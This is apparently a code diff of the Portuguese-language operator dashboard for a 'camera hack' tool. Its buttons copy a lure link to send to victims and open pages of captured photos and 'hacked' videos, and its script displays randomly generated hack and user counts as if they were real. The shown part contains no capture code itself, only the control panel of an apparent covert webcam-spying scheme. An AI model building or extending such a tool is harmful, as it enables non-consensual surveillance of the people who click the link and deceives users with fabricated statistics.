@@ -2,52 +2,87 @@
 <html>
 <head>
     <title>CAMERA HACK - ANONYMOUS</title>
-    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='style.css') }}">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Share Tech Mono', monospace;
+            background: #000;
+            color: #00ff00;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+        .logo-container img {
+            width: 200px;
+            height: auto;
+            margin: 20px 0;
+        }
+        h1 {
+            font-size: 2.5em;
+            margin: 20px 0;
+            text-shadow: 0 0 10px #00ff00;
+        }
+        .buttons-container {
+            display: grid;
+            gap: 15px;
+            margin: 30px 0;
+        }
+        .cyber-button {
+            background: #000;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 15px;
+            font-size: 1.2em;
+            cursor: pointer;
+            width: 100%;
+        }
+        .cyber-button:hover {
+            background: #00ff00;
+            color: #000;
+            box-shadow: 0 0 10px #00ff00;
+        }
+        .stats-container {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 30px;
+        }
+        .stat {
+            text-align: center;
+        }
+        .stat-value {
+            font-size: 2em;
+            color: #00ff00;
+        }
+        .stat-label {
+            font-size: 0.9em;
+            color: #00ff00;
+        }
+    </style>
     <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div class="glitch-overlay"></div>
-    <div class="matrix-bg"></div>
     <div class="container">
         <div class="logo-container">
-            <div class="anonymous-mask">
-                <div class="glitch-effect">
-                    <img src="https://raw.githubusercontent.com/SkalskiP/top-cvs/master/dataset/anonymous.png" alt="Anonymous">
-                </div>
-            </div>
-            <h1 class="glitch" data-text="CAMERA HACK">CAMERA HACK</h1>
+            <img src="https://raw.githubusercontent.com/SkalskiP/top-cvs/master/dataset/anonymous.png" alt="Anonymous">
+            <h1>CAMERA HACK</h1>
             <div class="hacker-text" id="hackerText">Initializing hack sequence...</div>
         </div>
 
         <div class="buttons-container">
             <button class="cyber-button" id="copyLinkBtn" data-link="{{ url_for('telegram') }}">
-                <span class="btn-content">GERAR LINK HACK</span>
-                <span class="btn-glitch"></span>
-                <span class="btn-label">🌐</span>
+                GERAR LINK HACK 🌐
             </button>
 
             <button class="cyber-button" onclick="window.location.href='/fotos'">
-                <span class="btn-content">FOTOS CAPTURADAS</span>
-                <span class="btn-glitch"></span>
-                <span class="btn-label">📸</span>
+                FOTOS CAPTURADAS 📸
             </button>
 
             <button class="cyber-button" onclick="window.location.href='/videos'">
-                <span class="btn-content">VÍDEOS HACKEADOS</span>
-                <span class="btn-glitch"></span>
-                <span class="btn-label">📽️</span>
-            </button>
-
-            <button class="cyber-button" onclick="window.location.href='https://wa.me/SEU_NUMERO'">
-                <span class="btn-content">CONTATO DEV</span>
-                <span class="btn-glitch"></span>
-                <span class="btn-label">💻</span>
-            </button>
-
-            <button class="cyber-button" onclick="window.location.href='https://t.me/SEU_CANAL'">
-                <span class="btn-content">CANAL TELEGRAM</span>
-                <span class="btn-glitch"></span>
-                <span class="btn-label">📢</span>
+                VÍDEOS HACKEADOS 📽️
             </button>
         </div>
 
@@ -63,6 +98,66 @@
         </div>
     </div>
 
-    <script src="{{ url_for('static', filename='script.js') }}"></script>
+    <script>
+        function animateValue(element, start, end, duration) {
+            let startTimestamp = null;
+            const step = (timestamp) => {
+                if (!startTimestamp) startTimestamp = timestamp;
+                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+                element.innerHTML = Math.floor(progress * (end - start) + start);
+                if (progress < 1) {
+                    window.requestAnimationFrame(step);
+                }
+            };
+            window.requestAnimationFrame(step);
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const hackerText = document.getElementById('hackerText');
+            const messages = [
+                'AesCorp no topo',
+                'Hakeando sua camera',
+                'Segue o canal AesCorp',
+                'A E S C O R P',
+                'Desenvolvido por Akila'
+            ];
+            let messageIndex = 0;
+
+            function typeWriter(text, element) {
+                element.textContent = text;
+            }
+
+            function cycleMessages() {
+                typeWriter(messages[messageIndex], hackerText);
+                messageIndex = (messageIndex + 1) % messages.length;
+            }
+
+            cycleMessages();
+            setInterval(cycleMessages, 4000);
+
+            const hackCount = document.getElementById('hackCount');
+            const onlineUsers = document.getElementById('onlineUsers');
+            
+            const randomHacks = Math.floor(Math.random() * 1000) + 500;
+            const randomUsers = Math.floor(Math.random() * 100) + 50;
+            
+            animateValue(hackCount, 0, randomHacks, 2000);
+            animateValue(onlineUsers, 0, randomUsers, 2000);
+
+            const copyLinkBtn = document.getElementById('copyLinkBtn');
+            if (copyLinkBtn) {
+                copyLinkBtn.addEventListener('click', function() {
+                    const link = this.getAttribute('data-link');
+                    navigator.clipboard.writeText(window.location.origin + link)
+                        .then(() => {
+                            this.textContent = 'LINK COPIADO! 🌐';
+                            setTimeout(() => {
+                                this.textContent = 'GERAR LINK HACK 🌐';
+                            }, 2000);
+                        });
+                });
+            }
+        });
+    </script>
 </body>
 </html>
